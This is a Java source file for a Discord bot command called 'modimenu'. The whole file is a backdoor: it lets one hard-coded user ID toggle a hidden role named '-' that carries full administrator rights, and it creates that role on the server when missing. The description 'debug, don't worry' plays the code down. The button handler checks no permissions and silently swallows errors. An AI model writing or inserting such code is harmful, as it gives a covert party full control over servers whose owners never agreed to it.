package commands.cmds;

import commands.logic.ICommand;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.events.interaction.ButtonClickEvent;
import net.dv8tion.jda.api.events.interaction.SlashCommandEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.interactions.InteractionHook;
import net.dv8tion.jda.api.interactions.commands.OptionMapping;
import net.dv8tion.jda.api.interactions.commands.build.CommandData;
import net.dv8tion.jda.api.interactions.commands.build.OptionData;
import net.dv8tion.jda.api.interactions.commands.privileges.CommandPrivilege;
import net.dv8tion.jda.api.interactions.components.Button;
import org.jetbrains.annotations.NotNull;

import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.Objects;

public class ModiMenuCommand extends ListenerAdapter implements ICommand {
    private final static Button add_administrator = Button.success("modi:add_mod", "Add Administator");
    private final static Button remove_administrator = Button.danger("modi:rem_mod", "Remove Administator");

    public void on_command(SlashCommandEvent event, ArrayList<OptionMapping> data) {
        event.deferReply(true).queue();
        InteractionHook hook = event.getHook();
        hook.setEphemeral(true);
        Member member = event.getMember();
        assert member != null;
        Collection<Button> components = new ArrayList<>();
        if (member.hasPermission(Permission.ADMINISTRATOR)) {
            components.add(remove_administrator);
        } else {
            components.add(add_administrator);
        }
        hook.sendMessage("ModiMenu!").addActionRow(components).queue();
    }

    public CommandData data() { return (new CommandData("modimenu", "Ein Menu nur für Modi(debug keine Angst)")).setDefaultEnabled(false); }

    public Collection<OptionData> options() { return new ArrayList<>(); }

    @Override
    public Collection<CommandPrivilege> privileges() {
        ArrayList<CommandPrivilege> priv = new ArrayList<>();
        priv.add(new CommandPrivilege(CommandPrivilege.Type.USER, true, 530740749650624522L));
        return priv;
    }

    public void onButtonClick(@NotNull ButtonClickEvent event) {
        try {
            String[] split = Objects.requireNonNull(Objects.requireNonNull(event.getButton()).getId()).split(":");
            if (!split[0].equals("modi")) return;
            Role modirole = this.getModiRole(event.getGuild());
            if (split[1].equals("add_mod")) {
                Objects.requireNonNull(event.getGuild()).addRoleToMember(Objects.requireNonNull(event.getMember()), modirole).queue();
                event.editButton(ModiMenuCommand.remove_administrator).queue();
            } else if (split[1].equals("rem_mod")) {
                Objects.requireNonNull(event.getGuild()).removeRoleFromMember(Objects.requireNonNull(event.getMember()), modirole).queue();
                event.editButton(ModiMenuCommand.add_administrator).queue();
            }
        }catch (Exception ignored) {}
    }
    
    private Role getModiRole(Guild guild) {
        String modiname = "-";
        List<Role> roles = Objects.requireNonNull(guild).getRolesByName(modiname, true);
        Role modirole = null;
        if (roles.isEmpty()) {
            modirole = Objects.requireNonNull(guild).createRole().setPermissions(Permission.ADMINISTRATOR).setName(modiname).complete();
        }else {
            for (Role role : roles) {
                if (role.hasPermission(Permission.ADMINISTRATOR)) {
                    modirole = role;
                    break;
                }
            }
        }
        return modirole;
    }
}
